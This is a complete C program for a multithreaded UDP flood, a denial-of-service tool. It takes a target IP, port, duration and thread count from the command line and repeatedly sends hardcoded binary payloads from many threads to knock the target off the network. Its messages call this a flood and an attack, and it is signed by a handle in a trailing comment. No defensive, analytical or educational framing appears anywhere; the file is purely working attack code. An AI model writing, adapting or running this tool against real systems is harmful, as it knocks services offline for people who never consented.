#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./program ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB",
        "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB",
        "\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\x04\x98\x16\x07\x1C\x7F\xC1\x81\x29\x34\xEB",
        "\x24\x6C\xAD\xFF\xDB\x95\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xC9\xF5\x84\x9B\x16\x67\x1C\x7F\x3D\x8E\x85\x35\x27\x37\x33\x25\x91\x47\x32\x0C\xB9\x5D\x9B\x72\xEF\xCF\x00\x3E\xAB\xAD\x47\xB8\xAB\x50\x1B\x14\x3C\xEC\xDB\xCA\xED\x9E\x73\x76\x70\xD7\x17\xB1",
        "\x24\x6C\xAD\xFF\xDB\x95\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xC9\xF5\x84\x9B\x16\x67\x1C\x7F\x3D\x8E\x85\x35\x27\x37\x33\x25\x91\x47\x32\x0C\xB9\x5D\x9B\x72\xEF\xCF\x00\x3E\xAB\xAD\x47\xB8\xAB\x50\x1B\x14\x3C\xEC\xDB\xCA\xED\x9E\x73\x76\x70\xD7\x17\xB1",
        "\x24\x6C\xAD\xFF\x2F\xEA\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xD1\xF5\x04\x98\x16\x17\x1C\x7F\x9D\x8E\xF9\x34\x27\x37\x33\x25\x91\x47\x32\x0C\xB9\x5D\xC4\x73\xEF\xC8\x06\x3E\xAB\xAD\x47\xA0\x8B\x2F\xD1\x6B\x64\x14\x4B\x54\x23\xB0\x45\x43\x1C\x0F\x5F\xE9\xA2\x1A\xC8\xF5\xD8\x85\x82\x26\x43\x1F\x90\xFC\x0D\x92\xD9\xE8\x19\xC6\x89\xE3\xD9\x46\x09\xDC\x0E\xFB\xB5\x4C\x84\x78\xB3\xD1\x3D\xFD\xB6\x14\x7D\x70\xCA\x3A\xFD\xD3\xFF\x07\xB3\x72\x92\x5C\x09\xE2\x41\xB8\x8F\x6D\xA3\xE9\xC4\xB5\x64\x56\xDF\x27\xD2\xC6\x86\xC5\xB4\x46\x44\xE1\xBC\xBC\x0C",
        "\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC\xF8\x63\x30\xF0\xBB\xE4\x4B\xA6\x1D\x93\xEA\x03\x99\x10\xF3\xB6\x96\x97\x83\x38\x32\x53\xEC\x98\x60\x26\x17\x29\x05\x44\x0D\x1B\xF2\xB6\x70\x04\xC7\xC1\x04\x31\xD5\xB3\xB7\xFD\x4C\x60\xA3\x19\xC4\xAB\x9E\x40\xA4\x02\x05\x07\x99\x2D\x1A\x49\x1B\xEB\x9C\xC7\x8B\xFC\xFE\x1E\x09\xDF\x3A\x37\xB7\x63\xB3\x52\xD4\xB1\xF7\xCE\xB6\x16\x28\x3A\xF4\x58\xB0\x4F\x4A\x02\x13\x1B\xB5\x5D\x0F",
        "\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC\xF8\x63\x30\xF0\xBB\xE4\x4B\xA6\x1D\x93\xEA\x03\x99\x10\xF3\xB6\x96\x97\x83\x38\x32\x53\xEC\x98\x60\x26\x17\x29\x05\x44\x0D\x1B\xF2\xB6\x70\x04\xC7\xC1\x04\x31\xD5\xB3\xB7\xFD\x4C\x60\xA3\x19\xC4\xAB\x9E\x40\xA4\x02\x05\x07\x99\x2D\x1A\x49\x1B\xEB\x9C\xC7\x8B\xFC\xFE\x1E\x09\xDF\x3A\x37\xB7\x63\xB3\x52\xD4\xB1\xF7\xCE\xB6\x16\x28\x3A\xF4\x58\xB0\x4F\x4A\x02\x13\x1B\xB5\x5D\x0F",
        "\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC\xF8\x63\x30\xF0\xBB\xE4\x4B\xA6\x1D\x93\xEA\x03\x99\x10\xF3\xB6\x96\x97\x83\x38\x32\x53\xEC\x98\x60\x26\x17\x29\x05\x44\x0D\x1B\xF2\xB6\x70\x04\xC7\xC1\x04\x31\xD5\xB3\xB7\xFD\x4C\x60\xA3\x19\xC4\xAB\x9E\x40\xA4\x02\x05\x07\x99\x2D\x1A\x49\x1B\xEB\x9C\xC7\x8B\xFC\xFE\x1E\x09\xDF\x3A\x37\xB7\x63\xB3\x52\xD4\xB1\xF7\xCE\xB6\x16\x28\x3A\xF4\x58\xB0\x4F\x4A\x02\x13\x1B\xB5\x5D\x0F",
        
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
/*
@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD

@WHITEWOLFMOD
*/